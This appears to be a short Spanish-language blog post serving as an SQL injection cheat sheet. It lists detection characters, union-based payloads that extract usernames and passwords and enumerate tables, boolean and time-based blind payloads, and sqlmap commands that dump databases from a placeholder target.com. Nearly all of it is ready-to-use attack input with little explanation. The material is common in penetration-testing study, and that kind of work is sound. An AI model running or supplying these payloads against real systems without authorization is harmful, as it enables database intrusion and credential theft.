---
layout: post
title: "SQL Injection"
date: 2025-01-20
categories: [ciberseguridad]
tags: [web, sqli, owasp, hacking, sqlmap]
description: "Técnicas de inyección SQL: Union-based, Blind, Time-based y sqlmap."
---

## ¿Qué es SQL Injection?

Vulnerabilidad que permite interferir con las consultas que una aplicación hace a su base de datos. OWASP Top 10.

## Detección básica

```sql
'
''
')
'))
```

## Union-based SQLi

```sql
-- Número de columnas
' ORDER BY 3--

-- Extraer datos
' UNION SELECT username,password,NULL FROM users--

-- Tablas
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
```

## Blind SQLi

```sql
-- Boolean
' AND 1=1--
' AND 1=2--

-- Time-based MySQL
' AND SLEEP(5)--
```

## sqlmap

```bash
# Básico
sqlmap -u "http://target.com/page?id=1" --dbs

# Con cookies
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc" --dbs

# Dump tabla
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump

# Con Burp request
sqlmap -r request.txt --level=5 --risk=3
```
